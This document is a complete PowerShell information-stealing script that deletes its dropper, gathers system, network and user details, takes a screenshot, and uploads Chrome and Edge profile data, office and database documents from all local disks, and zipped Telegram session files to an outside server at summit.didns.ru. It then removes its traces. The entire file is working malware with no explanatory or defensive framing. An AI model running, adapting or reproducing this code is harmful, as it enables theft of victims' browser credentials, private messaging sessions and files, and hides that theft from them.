Remove-Item –path C:\Windows\Temp\5db65c7.ps1
Add-Type -assembly "system.io.compression.filesystem"

$source = "C:\windows\temp\8f720a5db6c7"
$destination = "https://summit.didns.ru/upload.aspx?fn="
$destination2 = "https://summit.didns.ru/upload2.aspx"
$log = "c:\windows\temp\777.log"

function Pos-Da($dest,$url)
{
	try{
	$buffer = [System.IO.File]::ReadAllBytes($dest) 
	[System.Net.HttpWebRequest] $webRequest = [System.Net.WebRequest]::Create($url)
	$webRequest.Timeout =10000000    
	$webRequest.Method = "POST"
	$webRequest.ContentType = "application/data"
	$requestStream = $webRequest.GetRequestStream()
	$requestStream.Write($buffer, 0, $buffer.Length)
	$requestStream.Flush()
	$requestStream.Close()

	[System.Net.HttpWebResponse] $webResponse = $webRequest.GetResponse()
	$streamReader = New-Object System.IO.StreamReader($webResponse.GetResponseStream())
	$result = $streamReader.ReadToEnd()	
	$streamReader.Close() 	
	}
	catch
	{  
    Write-Error $_.Exception.Message | out-file $log -Append
	}	
	
}

function Add-Zip
{
	param([string]$zipfilename)

	if(-not (test-path($zipfilename)))
	{
		set-content $zipfilename ("PK" + [char]5 + [char]6 + ("$([char]0)" * 18))
		(dir $zipfilename).IsReadOnly = $false	
	}
	
	$shellApplication = new-object -com shell.application
	$zipPackage = $shellApplication.NameSpace($zipfilename)
	
	foreach($file in $input) 
	{ 
            $zipPackage.CopyHere($file.FullName)
            Start-sleep -milliseconds 500
	}
}

function Get-ScreenCapture
{
    param(    
    [Switch]$OfWindow        
    )


    begin {
        Add-Type -AssemblyName System.Drawing
        $jpegCodec = [Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | 
            Where-Object { $_.FormatDescription -eq "JPEG" }
    }
    process {
        Start-Sleep -Milliseconds 250
        if ($OfWindow) {            
            [Windows.Forms.Sendkeys]::SendWait("%{PrtSc}")        
        } else {
            [Windows.Forms.Sendkeys]::SendWait("{PrtSc}")        
        }
        Start-Sleep -Milliseconds 250
        $bitmap = [Windows.Forms.Clipboard]::GetImage()    
        $ep = New-Object Drawing.Imaging.EncoderParameters  
        $ep.Param[0] = New-Object Drawing.Imaging.EncoderParameter ([System.Drawing.Imaging.Encoder]::Quality, [long]100)  
        $screenCapturePathBase = "$source\ScreenCapture"
        $c = 0
        while (Test-Path "${screenCapturePathBase}${c}.jpg") {
            $c++
        }
        $bitmap.Save("${screenCapturePathBase}${c}.jpg", $jpegCodec, $ep)
    }
}

New-Item -ItemType directory -Path $source
Get-WmiObject -class win32_computersystem | Out-File $source\summary.txt
Get-WmiObject Win32_BIOS -computerName localhost | Out-File $source\bios.txt;
Get-WmiObject -Class “win32_PhysicalMemory” -namespace “root\CIMV2” | Out-File $source\ram.txt;
@(Get-WmiObject -class win32_processor | Select Caption, Description, NumberOfCores, NumberOfLogicalProcessors, Name, Manufacturer, SystemCreationClassName, Version) | Out-File $source\cpu.txt;
gwmi Win32_NetworkAdapterConfiguration | Where { $_.IPAddress } | Select -Expand IPAddress | Out-File $source\ip.txt;
gwmi Win32_NetworkAdapterConfiguration | Out-File $source\NetworkAdapterConfig.txt;
get-WmiObject win32_logicaldisk | Out-File $source\disk.txt;
Get-Process | Out-File -filepath $source\process.txt;
Get-NetAdapter | Out-File $source\NetworkAdapter.txt;
#net view | Out-File $source\NetView.txt;
Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table –AutoSize | Out-File $source\apps.txt;
ipconfig /all | Out-File $source\ipConfig.txt;
netstat -ano | Out-File $source\netstat.txt;
arp -a -v | Out-File $source\arp.txt;
net user | Out-File $source\netuser.txt;
Get-CimInstance Win32_OperatingSystem | FL * | Out-File $source\os.txt;
Get-ExecutionPolicy -List | Out-File $source\policy.txt;
Get-Service | Out-File $source\service.txt;
Get-ScreenCapture


$files = Get-ChildItem $source
foreach ($file in $files)
{    
    Pos-Da -dest $file.FullName -url "$destination+$file" 
} 



 $files = Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
 foreach ($file in $files)
{ 
try{
	$destUrl="{0}ChromeDef_{1}" -f $destination, $file.Name 
	Pos-Da -dest $file.FullName -url $destUrl
	Start-Sleep -Milliseconds 500
}
catch{}
}

$files = Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data\"
 foreach ($file in $files)
{ 
try{
	$destUrl="{0}ChromeUser_{1}" -f $destination, $file.Name 
	Pos-Da -dest $file.FullName -url $destUrl
	Start-Sleep -Milliseconds 500
}
catch{}
}

#
$files = Get-ChildItem "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"
 foreach ($file in $files)
{ 
try{
	$destUrl="{0}EdgDef_{1}" -f $destination, $file.Name 
	Pos-Da -dest $file.FullName -url $destUrl
	Start-Sleep -Milliseconds 500
}
catch{}
}

$files = Get-ChildItem "$env:LOCALAPPDATA\Microsoft\Edge\User Data\"
 foreach ($file in $files)
{ 
try{
	$destUrl="{0}EdgUser_{1}" -f $destination, $file.Name 
	Pos-Da -dest $file.FullName -url $destUrl
	Start-Sleep -Milliseconds 500
}
catch{}
}



$files = (Get-WMIObject Win32_LogicalDisk -filter "DriveType = 3" | Select-Object DeviceID | ForEach-Object {Get-Childitem ($_.DeviceID + "\") -include *.doc,*.docx,*.pptx,*.pdf,*.txt,*.xls,*.xlsx,*.bak,*.db,*.mdb,*.accdb,*.sqlite3 -recurse})

foreach ($file in $files)
{ 
	$destUrl="{0}{1}" -f $destination, $file.Name 
	Pos-Da -dest $file.FullName -url $destUrl
	Start-Sleep -Milliseconds 500
}





$path= Split-Path -Path (Get-WMIObject Win32_LogicalDisk -filter "DriveType = 3" | Select-Object DeviceID | ForEach-Object {Get-Childitem ($_.DeviceID + "\") -Attributes !Directory,!Directory+Hidden -include Telegram.exe -recurse})

$index=0
foreach ($a in $path)
{	
    try{
    $tempDwn="C:\windows\temp\tdata{0}" -f $index
    New-Item -ItemType Directory -Force -Path $tempDwn"\D877F783D5D3EF8C"
	$source= $a+"\tdata\D877F783D5D3EF8C"
    if(Test-Path -Path $source)
        {
			$d8files=Get-ChildItem -Path $source | Where-Object {$_.Name.Contains("map")} | select FullName, Name
			foreach($d8 in $d8files)
			{
                 $mtemp="{0}\D877F783D5D3EF8C\{1}" -f $tempDwn, $d8.Name 
				 Copy-Item $d8.FullName -Destination $mtemp
			}
           
        } else {
        continue
        }   
   
        $tempFiles=Get-ChildItem -Path $a"\tdata" | Where-Object {$_.PSIsContainer -eq $false} | select FullName, Name
        foreach ($file in $tempFiles)
        {
			try
			{
			$destTemp="{0}\{1}" -f $tempDwn, $file.Name 
			Copy-Item $file.FullName -Destination  $destTemp
				}
			catch{}
        }
        
	echo $tempDwn
	$dest="C:\windows\temp\tdata{0}.zip" -f $index
	
	[io.compression.zipfile]::CreateFromDirectory($tempDwn, $dest) 	    
	Start-Sleep -s 15
	Pos-Da -dest $dest -url $destination2
    }catch
	{  
    Write-Error $_.Exception.Message | out-file $log -Append
	}	
	$index++
	Start-Sleep -s 15
	Remove-Item –path $dest 
    Remove-Item –path $tempDwn -Recurse
}

Remove-Item –path $source -Recurse
Remove-Item -path $log 